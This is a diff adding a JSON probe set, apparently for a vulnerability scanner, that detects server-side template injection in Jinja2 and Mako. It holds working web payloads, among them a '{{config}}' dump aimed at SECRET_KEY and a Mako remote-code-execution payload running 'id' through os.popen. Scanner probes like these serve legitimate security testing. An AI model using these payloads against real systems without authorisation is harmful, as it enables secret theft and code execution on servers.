@@ -1,0 +1,152 @@
+{
+  "category": "ssti_python",
+  "description": " \u2014 Python engines (Jinja2, Mako)",
+  "contexts": {
+    "jinja2": {
+      "description": "Server-Side Template Injection probes for Jinja2 (Flask/Django Python stacks)",
+      "tech_match": [
+        "Flask",
+        "Django",
+        "Python"
+      ],
+      "param_match": [
+        "name",
+        "template",
+        "msg",
+        "text",
+        "title",
+        "comment",
+        "input",
+        "value",
+        "q"
+      ],
+      "probes": [
+        {
+          "payload": "{{7*7}}",
+          "description": "Jinja2 arithmetic evaluation \u2014 response containing 49 confirms template execution",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "49"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "$49",
+                "49 ",
+                " 49.",
+                "\"49\"",
+                "v49",
+                "#49"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        },
+        {
+          "payload": "{{config}}",
+          "description": "Jinja2 config dump \u2014 reveals SECRET_KEY and DEBUG mode",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "SECRET_KEY",
+                "DEBUG"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        }
+      ]
+    },
+    "mako": {
+      "description": "Server-Side Template Injection probes for Python Mako templates",
+      "tech_match": [
+        "Python",
+        "Pyramid",
+        "TurboGears"
+      ],
+      "param_match": [
+        "name",
+        "template",
+        "msg",
+        "text",
+        "title",
+        "comment",
+        "input",
+        "value",
+        "q"
+      ],
+      "probes": [
+        {
+          "payload": "${7*7}",
+          "description": "Mako expression evaluation \u2014 49 in response confirms Mako template execution",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "49"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "$49",
+                "49 ",
+                " 49.",
+                "\"49\"",
+                "v49",
+                "#49"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "<%import os%>${os.popen('id').read()}",
+          "description": "Mako RCE via import tag and os.popen \u2014 uid= in response confirms arbitrary code execution",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "uid="
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 95,
+          "variables": {}
+        },
+        {
+          "payload": "<% import os %>${os.name}",
+          "description": "Mako OS detection via import \u2014 'posix' or 'nt' in response confirms Python code execution within Mako template",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "posix",
+                "nt"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
